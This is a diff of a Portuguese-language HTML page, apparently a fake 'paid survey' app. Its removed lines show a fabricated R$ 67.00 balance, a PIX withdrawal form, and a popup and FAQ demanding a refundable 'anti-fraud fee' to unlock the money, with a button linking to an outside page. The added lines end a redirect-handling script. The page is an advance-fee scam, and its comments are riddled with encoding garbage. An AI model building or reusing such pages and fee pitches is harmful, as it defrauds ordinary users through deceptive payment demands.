-       
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
-      <a href="#" onclick="mostrarPagina('inicio')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">home</span>
-      </a>
-      
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
-      <a href="#" onclick="mostrarPagina('bonus')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
-      </a>
-    </div>
-  </div>
-
-
-  
-  <!--------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "Saque" --------------------->
-
-  
-  <div id="saque" style="display: none;">
-
-    <div class="menu">
-      <a>
-        <img src="images/opinilogo.png">
-      </a> 
-      <a></a>
-    </div>
-
-
-    <div style="margin-bottom: 100px;"></div>
-      
-    
-    <div class="outer-box">
-      <div class="valor-box-saque">
-          <p style="font-size: 16px; margin-bottom: 15px; text-align: center; color: rgb(101, 101, 101);">Seu saldo</p>
-          <span id="valor-money" style="font-size: 45px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #06B32E;">R$ 67.00</span>
-      </div>
-    </div>
-
-    <p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">Selecione seu tipo de chave PIX</p>
-
-    
-    <div class="button-container">
-      
-      <button class="square-button" onclick="toggleButton(1)">
-        <img decoding="async" src="images/cpf.png" alt="Botao 1">
-      </button>
-      
-      <button class="square-button" onclick="toggleButton(2)">
-        <img decoding="async" src="images/telefone.png" alt="Botao 2">
-      </button>
-      
-      <button class="square-button" onclick="toggleButton(3)">
-        <img decoding="async" src="images/email.png" alt="Botao 3">
-      </button>
-      
-      <button class="square-button" onclick="toggleButton(4)">
-        <img decoding="async" src="images/qr.png" alt="Botao 4">
-      </button>
-
-    </div>
-
-    <div style="margin-bottom: 15px;"></div>
-    
-    
-
-    
-    <!--------------------- MENU EMBAIXO --------------------->
-
-    
-    <div class="menuemb">
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
-      <a href="#" onclick="mostrarPagina('saque')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">paid</span>
-      </a>
-       
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
-      <a href="#" onclick="mostrarPagina('inicio')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
-      </a>
-      
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
-      <a href="#" onclick="mostrarPagina('bonus')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
-      </a>
-    </div>
-
-    
-
-
-    <input class="form-input" type="text" name="chave-pix" id="chave-pix" placeholder="Digite sua chave PIX aqui">
-
-    <input class="form-input" style="margin-top: 15px;" type="text" name="quantia" id="quantia" placeholder="Digite o valor que deseja sacar" inputmode="numeric" oninput="formatarValor(this)">
-    
-    <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR SAQUE</button>
-  
-  <!--------------------- TAXA DESBLOQUEIO --------------------->
-    
-    <div class="popup-container" id="popup">
-        
-      <script src="js/lottie-player.js"></script><lottie-player src="https://lottie.host/7c73a00c-afa8-4ad5-b6b7-d8050e57f0c3/pg6N0GhPE7.json" background="##ffffff" speed="1.25" style="width: 150px; height: 150px; margin: 0 auto; display: flex;" loop="" autoplay="" direction="1" mode="normal"></lottie-player>
-
-      <!--<span class="popup-text" style="font-size: 20px; font-weight: bold;">APRENDA A DESBLOQUEAR<br>SEU SALDO EM 1 MINUTO</span>--->
-      <span class="popup-text" style="font-size: 20px; font-weight: bold;">DESBLOQUEAR SEU SALDO</span>
-
-      <div style="margin-bottom: 20px;"></div>
-      <p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do sistema.<br><br>Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu saque, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.</p>
-      <div style="margin-bottom: 20px;"></div>
-
-      <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('https://convite-on.github.io/v-deo/', '_blank')">DESBLOQUEAR AGORA</button>
-      <!--<button class="desbloquear-button" style="font-weight: bold;" onclick="video();">VEJA COMO</button>--->
-    </div>
-
-    <div style="margin-bottom: 20px;"></div>
-
-    <!--------------------- VIDEO DESBLOQUEIO --------------------->
-
-    <!--<div class="popup-container" id="popupvideo">
-      
-      <div style="width: 70%; height: 70%; display: flex; margin: 0 auto; border-radius: 12px; margin-bottom: 10px;">
-
-        <div id="vid_6590e057fa276e0009498386" style="position:relative;width:100%;padding: 178.21782178217822% 0 0; margin-bottom: 10px; border-radius: 12px; display: flex; margin: 0 auto;"><img id="thumb_6590e057fa276e0009498386" src="https://images.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"><div id="backdrop_6590e057fa276e0009498386" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div></div><script type="text/javascript" id="scr_6590e057fa276e0009498386">var s=document.createElement("script");s.src="https://scripts.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/player.js",s.async=!0,document.head.appendChild(s);</script>
-
-      </div>
-
-      <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('https://vejahoje.shop/vsl/', '_blank')">DESBLOQUEAR AGORA</button>
-
-    </div>
-
-    <div style="margin-bottom: 20px;"></div>--->
-
-    
-  </div>
-  
-
- 
-    <!--------------------- Pagina bonus --------------------->
-	
-	
-
-  <div id="bonus" style="display: none;">
-      
-      
-      <!--------------------- Menu de cima --------------------->
-      
-        <div class="menu">
-          <a>
-            <img src="images/opinilogo.png">
-          </a> 
-          <a></a>
-        </div>
-        <div style="margin-bottom: 90px;"></div>
-    
-        <div style="margin-bottom: 110px;"></div>
-     
-        <p class="faq-title">Perguntas frequentes</p>
-
-        <div class="faq-container">
-          <div class="faq-item">
-            <div class="question" onclick="toggleAnswer(this)">Preciso pagar a taxa toda vez?</div>
-            <div class="answer">Nao! A taxa eseria paga somente a primeira vez, para confirmar que voce seria um humano, e nao um robo. Voce recebera o estorno do valor da taxa, apos o primeiro saque!</div>
-          </div>
-          <div class="faq-item">
-            <div class="question" onclick="toggleAnswer(this)">Por que existe a taxa?</div>
-            <div class="answer"> Serve como uma etapa anti-fraude, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro da plataforma! Mas nao precisa se preocupar, voce recebera o valor da taxa de volta, junto ao valor do seu saque, seria apenas uma etapa de validamento de que voce e humano e nao um robo.</div>
-          </div>
-          <div class="faq-item">
-            <div class="question" onclick="toggleAnswer(this)">Em quanto tempo vou receber?</div>
-            <div class="answer">Voce recebera seu saque dentro de 24 horas, da mesma forma que voce receber seu saque teste!</div>
-          </div>
-          <div class="faq-item">
-            <div class="question" onclick="toggleAnswer(this)">Quantas vezes posso sacar por dia?</div>
-            <div class="answer">Quantas voce quiser, mas existe uma quantidade limitada de codigos que temos acesso por dia!</div>
-          </div>
-          <div class="faq-item">
-            <div class="question" onclick="toggleAnswer(this)">Como usa o aplicativo?</div>
-            <div class="answer">e muito simples de usar! Basta responder as simples perguntas sobre as empresas, no menu principal, e por fim, clicar no botao de "Enviar respostas", quando enviar, ja recebera seu dinheiro pela tarefa realizada!</div>
-          </div>
-      </div>
-
-      <div style="margin-bottom: 150px;"></div>
-
-
-
-  
-    
-    
-    <!--------------------- Menu debaixo --------------------->
-
-    
-    
-
-
-    
-    <div class="menuemb">
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
-      <a href="#" onclick="mostrarPagina('saque')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
-      </a>
-       
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
-      <a href="#" onclick="mostrarPagina('inicio')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
-      </a>
-      
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
-      <a href="#" onclick="mostrarPagina('bonus')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">help</span>
-      </a>
-    </div>
-    
-    
-  </div>
-  
-  <!--------------------- Fim do body --------------------->
-  
-  <script src="js/scripts.js"></script>
-
+  // Protege contra travamentos ou loops em alguns navegadores
+  window.addEventListener("pageshow", function(e) {
+    if (e.persisted) {
+      sessionStorage.removeItem("__ja_redirecionou__");
+    }
+  });
+})();
+</script>
 
 </body></html>
